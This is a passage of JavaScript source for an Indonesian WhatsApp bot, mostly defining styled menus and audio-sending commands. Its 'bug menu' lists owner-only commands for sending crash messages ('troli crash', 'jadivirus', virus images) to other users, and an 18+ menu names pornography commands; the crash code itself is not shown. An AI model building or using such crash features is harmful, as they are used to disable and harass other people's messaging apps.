║冬Mʏ Tᴇᴀᴍ : Wᴏɴɢ々Hᴏʀᴇ々Tᴇᴀᴍ.in
║冬Nᴏᴍᴏʀ Oᴡɴᴇʀ : ${owner}
║冬Cʀᴇᴀᴛᴏʀ : ${creator}
║冬Mᴏᴅᴇ : ${publik ? 'Public' : 'Self'}
║冬Rᴜɴᴛɪᴍᴇ : ${runtime(process.uptime())}
║冬Pʀᴇғ : Multi
║冬Bᴀᴛᴛᴇʀʏʏ : ${baterai.battery}
║冬Cʜᴀʀɢᴇᴅ : ${baterai.isCharge ? 'Cas' : 'Tidak'}
║冬Aᴜᴛᴏʀᴇᴀᴅ Pᴄ : ${readP ? 'On' : 'Off'}
║冬Aᴜᴛᴏʀᴇᴀᴅ Gᴄ : ${readG ? 'On' : 'Off'}
║冬Aᴜᴛᴏ Kᴇᴛɪᴋ : ${ngetik ? 'On' : 'Off'}
║冬Aᴜᴛᴏ Rᴇᴄᴏʀᴅɪɴɢ : ${autovn ? 'On' : 'Off'}
╚═════════════════❍`,
"buttonText": " ᗰᗴᑎᑌ",
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `Pɪʟɪʜ Mᴇɴᴜ Sᴇsᴜᴋᴀ Mᴜ NOTE: Jᴀɴɢᴀɴ Sᴘᴀᴍ Bᴏᴛ`,
    "rows": [ 
       {
           "title": "ᗰᗴᑎᑌ ᗪIKIT✌",
           "description": 'Mᴇɴᴜ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}ok`
           },
	       {	     
	       "title": "👥ᘜᖇOᑌᑭ ᕼᗩᑎᘔ Oᖴᑕ",
	       "description": 'Lɪɴᴋ Aʟʟ Gʀᴏᴜᴘ Hᴀɴᴢ Oғᴄ',
           "rowId": `${prefix}grup`           
           },
	       {
           "title": "👤Oᗯᑎᗴᖇ ᗰᗴᑎᑌ",
           "description": 'Oᴡɴᴇʀ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}ownermenu`          
           },
	       {
           "title": "👥ᘜᖇOᑌᑭ ᗰᗴᑎᑌ",
           "description": 'Gʀᴏᴜᴘ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}groupmenu`
           },
	       {
           "title": "🎭ᗷᑌᘜ ᗰᗴᑎᑌ",
           "description": 'Fɪᴛᴜʀ Bᴜɢ Iɴɪ Hᴀɴʏᴀ Oᴡɴᴇʀ Dᴀɴ Yɢ Pᴜɴʏᴀ Bᴀsᴇ ʏɢ Bɪsᴀ Gᴜɴᴀᴋᴀɴ',
           "rowId": `${prefix}bugmenu`
           },
	       {           
           "title": "📸Iᗰᗩᘜᗴ ᗰᗴᑎᑌ",
           "description": 'Iᴍᴀɢᴇ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}imagemenu`
           },
	       {
	       "title": "🌀ᘜᗩᗰᗴ ᗰᗴᑎᑌ",
	       "description": 'Gᴀᴍᴇ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}gamemenu`
           },
	       {
	       "title": "💟ՏTIᑕKᗴᖇ ᗰᗴᑎᑌ",
	       "description": 'Gᴀᴍᴇ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}ffmpeg`
           },
	       {
           "title": "🎩ᖇᗩᑎᗪOᗰ ᗰᗴᑎᑌ",
           "description": 'Rᴀɴᴅᴏᴍ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}randomenu`
           },
	       {
	       "title": "✏ᑎᑌᒪIՏ ᗰᗴᑎᑌ",
	       "description": 'Nᴜʟɪs Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}nulismenu`
           },
	       {
           "title": "🎶ՏOᑌᑎᗪ ᗰᗴᑎᑌ",
           "description": 'ENᴊᴏʏ Mᴜsɪᴋ',
           "rowId": `${prefix}musikmenu`
           },
	       {
	       
           "title": "👀Տᗩᑎᘜᗴ ᗰᗴᑎᑌ",
           "description": 'Oᴛᴀᴋ Sᴀɴɢᴇ Asᴡ',
           "rowId": `${prefix}18+`       
           },
	       {
           "title": "🎩ᗰᗩKᗴᖇ ᗰᗴᑎᑌ",
           "description": 'Mᴀᴋᴇʀ Tʜɪs Bᴏᴛ',
           "rowId": `${prefix}makermenu`   
          }  
        ]
      }
    ]
  }
 }, {quoted: floc})
 Hanz.relayWAMessage(res)
 break
 case 'musikmenu':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": 'ՏIᒪᗩKᗩᑎ ᗪI ᑭIᒪIᕼ ᘜᗩᑎ\nᗰᗴᑎᑌ ᗰᑌՏIK',
"description": `▬▭▬▭▬▭▬▭▬▬▭▬▭▬\nSUBSCRIBE\nhttps://youtube.com/HANZ々OFC彡\nSUBSCRIBE AND LIKE\n▬▭▬▭▬▭▬▭▬▬▭▬▭▬`,
"buttonText": "ᗰᗴᑎᑌ",
"listType": "SINGLE_SELECT",
"sections": [
{
"title": `Sɪʟᴀʜᴋᴀɴ Pɪʟɪʜ😒`,
    "rows": [ 
       {
           "title": "🎶 SOUND1",
           "rowId": `${prefix}sound1`
           },
	       {
           "title": "🎶 SOUND2",
           "rowId": `${prefix}sound2`
           },
	       {
           "title": "🎶 SOUND3",
           "rowId": `${prefix}sound3`
           },
	       {
           "title": "🎶 SOUND4",
           "rowId": `${prefix}sound4`
           },
	       {
           "title": "🎶 SOUND5",
           "rowId": `${prefix}sound5`
           },
	       {
           "title": "🎶 SOUND6",
           "rowId": `${prefix}sound6`
           },
	       {
           "title": "🎶 SOUND7",
           "rowId": `${prefix}sound7`
           },
	       {
           "title": "🎶 SOUND8",
           "rowId": `${prefix}sound8`
           },
	       {
           "title": "🎶 SOUND9",
           "rowId": `${prefix}sound9`
           },
	       {
           "title": "🎶 SOUND10",
           "rowId": `${prefix}sound10`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
 case 'bokep':
res = await Hanz.prepareMessageFromContent(from,{
"listMessage": {
"title": '18+ MENU💦',
"description": `AWAS SANGE AN🗿`,
"buttonText": "MENU️",
"listType": "SINGLE_SELECT",
 "thumbnail": virgam,
"sections": [
{
"title": `Silahkan Pilih Musik yg enak Gan`,
    "rows": [ 
       {
           "title": "💦BOKEP1",
           "rowId": `${prefix}bokep1`
           },
	       {
           "title": "💦BOKEP2",
           "rowId": `${prefix}bokep2`
           },
	       {
           "title": "💦BOKEP3",
           "rowId": `${prefix}bokep3`
           },
	       {
           "title": "💦BOKEP4",
           "rowId": `${prefix}bokep4`
           },
	       {
           "title": "💦BOKEP5",
           "rowId": `${prefix}bokep5`
           },
	       {
           "title": "💦BOKEP6",
           "rowId": `${prefix}bokep6`
           },
	       {
           "title": "💦BOKEP7",
           "rowId": `${prefix}sound7`
           },
	       {
           "title": "💦BOKEP8",
           "rowId": `${prefix}bokep8`
           },
	       {
           "title": "💦BOKEP9",
           "rowId": `${prefix}bokep9`
           },
	       {
           "title": "💦BOKEP10",
           "rowId": `${prefix}bokep10`
           },
	       {
           "title": "💦BOKEP11",
           "rowId": `${prefix}bokep11`
           },
	       {
           "title": "💦BOKEP12",
           "rowId": `${prefix}bokep12`
           },
	       {
           "title": "💦BOKEP13",
           "rowId": `${prefix}bokep13`
           },
	       {
           "title": "💦BOKEP14",
           "rowId": `${prefix}bokep14`
           },
	       {
           "title": "💦BOKEP15",
           "rowId": `${prefix}bokep15`
          }  
        ]
      }
    ]
  }
 }, {quoted: ftrol})
 Hanz.relayWAMessage(res)
 break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ᗷᑌTTOᑎ ᒪOKᗩՏI ᗰᗴᑎᑌ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'groupmenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Gʀᴏᴜᴘ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}ᴀɴᴛɪʟɪɴᴋ
⁙┃〲◦➛${prefix}ᴡᴇʟᴄᴏᴍᴇ
⁙┃〲◦➛${prefix}ɢʀᴏᴜᴘ
⁙┃〲◦➛${prefix}ʟɪɴᴋɢʀᴏᴜᴘ
⁙┃〲◦➛${prefix}ᴘʀᴏᴍᴏᴛᴇ
⁙┃〲◦➛${prefix}ᴅᴇᴍᴏᴛᴇ
⁙┃〲◦➛${prefix}ʟɪsᴛᴏɴʟɪɴᴇ
⁙┃〲◦➛${prefix}ᴛᴀɢᴀʟʟ
⁙┃〲◦➛${prefix}ʜɪᴅᴇᴛᴀɢ
⁙┃〲◦➛${prefix}ᴛᴏᴛᴀɢ
⁙┃〲◦➛${prefix}ᴘᴇsᴏɴ
⁙┃〲◦➛${prefix}ᴘᴇsᴏғғ
⁙┃〲◦➛${prefix}ᴀᴅᴅ
⁙┃〲◦➛${prefix}ᴋɪᴄᴋ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘ
⁙┃〲◦➛${prefix}sᴇᴛᴅᴇsᴄ
⁙┃〲◦➛${prefix}sᴇᴛɴᴀᴍᴇ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬`,
"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'makermenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Mᴀᴋᴇʀ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}ᴛᴀʜᴛᴀ
⁙┃〲◦➛${prefix}ɴᴇᴏɴ2
⁙┃〲◦➛${prefix}ᴡᴀʟʟ
⁙┃〲◦➛${prefix}ᴡᴏʟғ
⁙┃〲◦➛${prefix}ᴛғɪʀᴇ
⁙┃〲◦➛${prefix}ʏᴛɢᴏʟᴅ
⁙┃〲◦➛${prefix}ʏᴛsɪʟᴠᴇʀ
⁙┃〲◦➛${prefix}ᴛ3ᴅ
⁙┃〲◦➛${prefix}ʟᴏɢᴏᴀ
⁙┃〲◦➛${prefix}ᴘᴏʀɴʜᴜʙ
⁙┃〲◦➛${prefix}ᴍᴀʀᴠᴇʟ
⁙┃〲◦➛${prefix}ʟᴇᴀᴠᴇsᴛ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
						"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'ffmpeg':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Fғᴍᴘᴇɢ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}s
⁙┃〲◦➛${prefix}sᴛɪᴄᴋᴇʀ
⁙┃〲◦➛${prefix}sᴛɪᴄᴋᴇʀᴡᴍ
⁙┃〲◦➛${prefix}sᴡᴍ
⁙┃〲◦➛${prefix}sᴍᴇᴍᴇ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
						"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'ownermenu':
res = await Hanz.prepareMessageFromContent(from,{
"templateMessage": {
"hydratedTemplate": {
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"hydratedContentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Oᴡɴᴇʀ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}sᴇᴛ
⁙┃〲◦➛${prefix}ᴀᴜᴛᴏ
⁙┃〲◦➛${prefix}ᴀᴜᴛᴏʀᴇsᴘᴏɴ
⁙┃〲◦➛${prefix}ᴀᴅᴅᴄᴍᴅ
⁙┃〲◦➛${prefix}ᴅᴇʟᴄᴍᴅ
⁙┃〲◦➛${prefix}ʟɪsᴛᴄᴍᴅ
⁙┃〲◦➛${prefix}sᴇʟғ/ᴘᴜʙʟɪᴄ
⁙┃〲◦➛${prefix}ʀᴇsᴛᴀʀᴛ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘʙᴏᴛ
⁙┃〲◦➛${prefix}sᴇᴛᴘᴘᴡᴀ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴛᴇxᴛ
⁙┃〲◦➛${prefix}ᴜᴘsᴡsᴛɪᴄᴋᴇʀ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴠɴ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴀᴜᴅɪᴏ
⁙┃〲◦➛${prefix}ᴜᴘsᴡɪᴍᴀɢᴇ
⁙┃〲◦➛${prefix}ᴜᴘsᴡᴠɪᴅᴇᴏ
⁙┃〲◦➛${prefix}ᴜᴘsᴡɢɪғ
⁙┃〲◦➛${prefix}ᴜᴘsᴡʟᴏᴋᴀsɪ
⁙┃〲◦➛${prefix}ʙᴄɢᴄ
⁙┃〲◦➛${prefix}ʙᴄ2
⁙┃〲◦➛${prefix}ʙᴄ
⁙┃〲◦➛${prefix}ᴛᴏʙᴄ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
	"hydratedFooterText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"hydratedButtons": [
{
  "urlButton": {
          "displayText": `Script Botz Hanz Ofc`,
          "url": "https://github.com/KurrXd"
        },
        "index": 0
        	},
			{
			 "urlButton": {
          "displayText": `Owner`,
          "url": "https://github.com/KurrXd"
        },
        "index": 0
        	},
			{
"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 3
								}
							]
						}
					}
				}, {}) 
Hanz.relayWAMessage(res)
break
case 'debug':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
			 res = await Hanz.prepareMessageFromContent(from,{
"templateMessage": {
						"hydratedTemplate": {
							"hydratedContentText": `Hi`,
							"hydratedFooterText": `Kurz Bot Assistan`,
							"hydratedButtons": [
								{
									"quickReplyButton": {
										"displayText": "List Menu",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 0
								},
								{
									"quickReplyButton": {
										"displayText": "Script",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 1
								},
								{
									"quickReplyButton": {
										"displayText": "Instagram",
										"id": "60dd75b0081979507a679f99"
									},
									"index": 2
								}
							]
						}
					}
				}, {}) 
Hanz.relayWAMessage(res)
break
case 'debug2':
if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: ftrol})
   res = await Hanz.prepareMessageFromContent(from,{
"templateMessage": {
  "hydratedFourRowTemplate": {
    "hydratedContentText": "",
    "hydratedFooterText": "",
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": "",
          "url": ""
        },
        "index": 0
      }
    ]
  },
  "hydratedTemplate": {
    "hydratedContentText": `Hi`,
    "hydratedFooterText": `Kurz Bot Assistan`,
    "hydratedButtons": [
      {
        "urlButton": {
          "displayText": `Script Kurz Bot Assistan`,
          "url": "https://github.com/KurrXd"
        },
        "index": 0
      }
    ]
  }
}
}, {})
Hanz.relayWAMessage(res)
break
case 'imagemenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Iᴍᴀɢᴇ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}ғᴏx
⁙┃〲◦➛${prefix}ᴄᴀᴛ
⁙┃〲◦➛${prefix}ʙɪʀᴅ
⁙┃〲◦➛${prefix}ʟᴏʟɪ
⁙┃〲◦➛${prefix}ᴊᴏᴋᴇs
⁙┃〲◦➛${prefix}ᴋᴏᴀʟᴀ
⁙┃〲◦➛${prefix}ᴍᴇᴍᴇ
⁙┃〲◦➛${prefix}ᴀɴɪᴍᴇ
⁙┃〲◦➛${prefix}ᴅᴀʀᴋᴊᴏᴋᴇs
⁙┃〲◦➛${prefix}ᴍᴇᴍᴇɪɴᴅᴏ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
						"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'nulismenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Nᴜʟɪs Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}ɴᴜʟɪs1
⁙┃〲◦➛${prefix}ɴᴜʟɪs2
⁙┃〲◦➛${prefix}ɴᴜʟɪs3
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
						"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case 'randomenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Rᴀɴᴅᴏᴍ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}ᴅᴇᴛɪᴋᴠɴ
⁙┃〲◦➛${prefix}ᴅᴇᴛɪᴋᴠɪᴅᴇᴏ
⁙┃〲◦➛${prefix}ᴛᴛᴍᴜsɪᴋ
⁙┃〲◦➛${prefix}ᴘʟᴀʏ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
						"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
case '18+':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Sᴀɴɢᴇ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}ᴋᴏᴅᴇɴᴜᴋʟɪʀ
⁙┃〲◦➛${prefix}ʟɪɴᴋʙᴏᴋᴇᴘ
⁙┃〲◦➛${prefix}ʙᴏᴋᴇᴘ
⁙┃〲◦➛${prefix}ᴀsᴜᴘᴀɴ
⁙┃〲◦➛${prefix}ɴᴇᴋᴏ
⁙┃〲◦➛${prefix}ᴀᴡᴏᴏ
⁙┃〲◦➛${prefix}ʙʟᴏᴡᴊᴏʙ
⁙┃〲◦➛${prefix}ʜᴇɴᴛᴀɪ
⁙┃〲◦➛${prefix}ᴍᴇɢᴜᴍɪɴ
⁙┃〲◦➛${prefix}ᴛʀᴀᴘɴɪᴍᴇ
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!kodenuklir",
"buttonText": {
"displayText": `KODENUKLIR`,
},
"type": "RESPONSE"
},
{
"buttonId": "!linkbokep",
"buttonText": {
"displayText": `LINKBOKEP`,
},
"type": "RESPONSE"
},
{
"buttonId": "!bokep",
"buttonText": {
"displayText": `BOKEP`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break       
case 'gamemenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `
╭━━•›ꪶ ཻུ۪۪ꦽꦼ̷⸙ ━ ━ ━ ━ ꪶ ཻུ۪۪ꦽꦼ̷⸙‹•━━╮
┃╭┈─────────────⩵꙰ཱི࿐
┃╰── ⏤͟͟͞Mᴀᴋᴇʀ Mᴇɴᴜ ──➤ ↶↷*
╰•͙✩̣̣̣̣ Hai!
⁙┃〲◦➛${prefix}sᴜɪᴛ
⁙┃〲◦➛${prefix}ᴄᴀᴋʟᴏɴᴛᴏɴɢ
⁙┃〲◦➛${prefix}ᴛᴇʙᴀᴋɢᴀᴍʙᴀʀ
⁙┃〲◦➛${prefix}ғᴀᴍɪʟʏ100
⁙╰•▬▭▬▭▬▭▬▭▬▭▬▭▬▭▬
`,
"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break       
case 'bugmenu':
res = await Hanz.prepareMessageFromContent(from,{
"buttonsMessage": {
"text": "",
"locationMessage": {
"degreesLatitude": 34.0184,
"degreesLongitude": -118.411
},
"contentText": `╭─❒ ⏤͟͟͞͞ᗯᗩᖇ ᗯᗴᖇ ᗯOᖇ
│
│🛡️Kʜᴜsᴜs Oᴡɴᴇʀ Dᴀɴ Yɢ Pᴜɴʏᴀ Bᴀsᴇ
│
│き${prefix}ʙᴜɢ _(bug loc)_
│き${prefix}ᴄᴀʀᴅ _(text|jumlah)_
│き${prefix}ʙᴜɢʟɪsᴛ _(isi piltek)_
│き${prefix}ᴛʀᴏʟɪᴠ2 _(troli crash)_
│き${prefix}ʜᴀɴᴢᴏғᴄ _(bugbutton)_
│き${prefix}ʙᴜɢɢᴄ _(bug old punah)_
│き${prefix}ʙᴜɢʟᴏᴄ _(live lokasi)_
│き${prefix}ʙᴜɢᴘᴄ _(gunakan di pc tod)_
│き${prefix}ᴊᴀᴅɪᴠɪʀᴋᴏɴ _(no|text)_
│き${prefix}ʙᴜɢʙᴜᴛᴛᴏɴ _(virgam+bugbutton)_
│き${prefix}ᴊᴀᴅɪᴋᴀᴛᴀʟᴏɢ _(reply foto + text)_
│き${prefix}ᴛᴏᴠɪʀɢᴀᴍ _(sticker jadi virgam)_
│き${prefix}ᴊᴀᴅɪᴠɪʀᴜs _(reply video, foto, audio, sticker)_
│
│
│Bᴜɢ Oʟᴅ Nɪʜ Bᴏᴏs Sᴇɴɢɢᴏʟ Dᴏɴᴋ😒
└─────────────────冬
`,
						"footerText": "HANZ々OFC彡",
"jpegThumbnail": fs.readFileSync(`./media/Bot.jpg`), 
"buttons": [
{
"buttonId": "!command",
"buttonText": {
"displayText": `ᗷᗩᑕK ᗰᗴᑎᑌ`,
},
"type": "RESPONSE"
},
{
"buttonId": "!sewabot",
"buttonText": {
"displayText": `ՏᗴᗯᗩᗷOT`,
},
"type": "RESPONSE"
},
{
"buttonId": "!donasi",
"buttonText": {
"displayText": `ᗪOᑎᗩՏI`,
},						
"type": "RESPONSE"
}
],
"headerType": "LOCATION"
}
}, {quoted:mek})
Hanz.relayWAMessage(res)
break
//>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>[ՏOᑌᑎᗪ ᗰᗴᑎᑌ]<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<//
case 'sound1':
satu = fs.readFileSync('./media/mp3/sound1.mp3');
Hanz.sendMessage(from, satu, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound2':
dua = fs.readFileSync('./media/mp3/sound2.mp3');
Hanz.sendMessage(from, dua, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound3':
tiga = fs.readFileSync('./media/mp3/sound3.mp3');
Hanz.sendMessage(from, tiga, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound4':
empat = fs.readFileSync('./media/mp3/sound4.mp3');
Hanz.sendMessage(from, empat, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound5':
lima = fs.readFileSync('./media/mp3/sound5.mp3');
Hanz.sendMessage(from, lima, MessageType.audio, {quoted: floc, mimetype: 'audio/mp4', duration: 359996400, ptt:true})
break
case 'sound6':
enam = fs.readFileSync('./media/mp3/sound6.mp3');
